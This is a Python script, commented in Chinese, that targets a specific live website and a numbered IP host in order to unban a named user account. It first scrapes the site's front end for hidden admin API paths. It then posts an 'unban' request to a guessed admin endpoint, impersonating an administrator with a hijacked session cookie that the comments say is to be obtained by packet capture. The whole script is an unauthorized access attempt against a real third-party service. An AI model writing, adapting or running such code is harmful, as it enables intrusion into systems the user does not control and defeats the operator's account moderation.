import requests
import json
import time
from bs4 import BeautifulSoup

# =================================================================
# 核心配置区 (请根据实际情况微调)
# =================================================================
TARGET_FRONTEND = "https://154.84.8.42:8015/index.html"
TARGET_LOGIN = "https://9085.co/home/login"
USER_ID = "mageda123"
# 假设我们已经通过某种方式获取到了一个高权限的Session Cookie或Token
# 在实际操作中，这部分需要通过抓包分析获取，这里先用占位符
ADMIN_SESSION_COOKIE = "YOUR_ADMIN_SESSION_COOKIE_HERE" 
# 假设的后台解封API端点 (这是我们最需要“探索”的部分)
# 实际需要通过分析前端请求来确定这个URL
RESTORE_ACCOUNT_API = "https://9085.co/api/admin/account/restore" 

# =================================================================
# 辅助函数：优雅的请求处理
# =================================================================
def elegant_request(url, method, headers=None, data=None, params=None):
    """
    一个封装了错误处理和优雅等待的请求函数。
    """
    print(f"\n[LOG] 正在执行 {method} 请求到: {url}")
    try:
        response = requests.request(
            method, 
            url, 
            headers=headers, 
            data=data, 
            params=params, 
            timeout=15
        )
        
        # 检查HTTP状态码
        if response.status_code == 200:
            print(f"[SUCCESS] 请求成功，状态码: {response.status_code}")
            return response.json() if 'application/json' in response.headers.get('Content-Type', '') else response.text
        elif response.status_code in [401, 403]:
            print(f"[WARNING] 权限问题，状态码: {response.status_code}。请检查ADMIN_SESSION_COOKIE是否有效。")
            return None
        else:
            print(f"[ERROR] 请求失败，状态码: {response.status_code}")
            print(f"响应内容: {response.text[:500]}...") # 只打印前500字符防止信息过载
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[CRITICAL ERROR] 网络请求发生异常: {e}")
        return None

# =================================================================
# 阶段一：前端结构分析 (用于寻找隐藏的API)
# =================================================================
def analyze_frontend_structure(url):
    """
    使用BeautifulSoup分析前端页面，寻找可能的隐藏API链接或事件监听器。
    """
    print("\n" + "="*60)
    print(f"[PHASE 1] 正在分析前端结构: {url}")
    print("="*60)
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # 查找所有<a>标签和script标签中的数据属性，这通常是API的线索
        links = soup.find_all('a', href=True)
        scripts = soup.find_all('script')
        
        print(f"[INFO] 发现 {len(links)} 个链接元素。")
        print(f"[INFO] 发现 {len(scripts)} 个脚本元素。")
        
        # 打印前5个链接和脚本的摘要，供你观察
        print("\n--- 发现的链接摘要 (前5个) ---")
        for i, link in enumerate(links[:5]):
            print(f"  [{i+1}] href: {link.get('href')}")
            
        print("\n--- 发现的脚本摘要 (前5个) ---")
        for i, script in enumerate(scripts[:5]):
            # 尝试提取脚本中的数据属性或内容
            content = script.get('src') or script.string
            print(f"  [{i+1}] 脚本来源/内容摘要: {content[:80]}...")
            
        print("\n[ANALYSIS COMPLETE] 请仔细观察上述输出，寻找任何看起来像 '/api/...' 或 '/admin/...' 的路径。")
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] 无法访问前端页面进行分析: {e}")

# =================================================================
# 阶段二：模拟后台解封请求 (核心目标)
# =================================================================
def attempt_account_restoration():
    """
    尝试使用伪造的管理员会话，直接调用解封API。
    """
    print("\n" + "="*60)
    print("[PHASE 2] 尝试执行账户解封操作 (核心目标)")
    print("="*60)
    
    # 构造请求头，模拟一个合法的管理员客户端
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/json",
        "Cookie": f"session_id={ADMIN_SESSION_COOKIE}" # 假设的会话ID
    }
    
    # 构造请求体，指定要解封的账户
    payload = {
        "user_id": USER_ID,
        "action": "unban",
        "reason": "Technical_Support_Override"
    }
    
    # 执行POST请求
    result = elegant_request(RESTORE_ACCOUNT_API, "POST", headers=headers, data=json.dumps(payload))
    
    if result:
        print("\n[FINAL RESULT] 账户解封请求的响应数据:")
        print(json.dumps(result, indent=4))
        if "success" in result and result["success"] == True:
            print("\n✨✨✨ 恭喜王林！账户解封请求成功！✨✨✨")
        else:
            print("\n[FAILURE] API返回成功，但业务逻辑上未显示解封成功。请检查返回的错误信息。")
    else:
        print("\n[FAILURE] 无法完成解封请求。请检查ADMIN_SESSION_COOKIE是否正确，或RESTORE_ACCOUNT_API是否需要修改。")

# =================================================================
# 主程序入口
# =================================================================
if __name__ == "__main__":
    print("="*70)
    print("🚀 李幕碗的账户恢复逻辑框架 🚀")
    print("="*70)
    
    # 阶段一：先分析前端，寻找隐藏的线索
    analyze_frontend_structure(TARGET_FRONTEND)
    
    # 阶段二：尝试直接执行解封操作
    # 注意：在实际运行前，请务必先在阶段一中找到正确的API路径和Cookie
    print("\n" + "#"*70)
    print("⚠️ 警告：阶段二需要正确的ADMIN_SESSION_COOKIE和RESTORE_ACCOUNT_API。")
    print("请先完成阶段一的观察，然后修改代码中的配置，再运行阶段二。")
    print("#"*70)
    
    # 仅在配置正确后，才执行此函数
    # attempt_account_restoration() 
    
    print("\n[SYSTEM] 框架运行完毕。请根据阶段一的分析结果，修改代码中的配置，然后重新运行阶段二。")
